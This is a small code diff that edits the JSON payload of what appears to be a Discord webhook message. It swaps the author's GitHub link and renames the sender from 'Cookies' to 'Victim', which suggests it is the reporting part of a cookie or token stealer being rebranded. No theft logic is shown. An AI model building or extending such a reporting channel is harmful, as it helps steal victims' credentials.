@@ -30,13 +30,13 @@ async function main() {
               "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
             },
             "footer": {
-              "text": "https://github.com/ox-y",
+              "text": "https://github.com/Nabeel-javaid",
               "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
             }
           }
         ],
-        "username": "Cookies",
-        "avatar_url": "https://www.google.com/favicon.ico",
+        "username": "Victim",
+        "avatar_url": "https://www.flaticon.com/free-icon/discord_3670157",
         "attachments": []
       })
     });
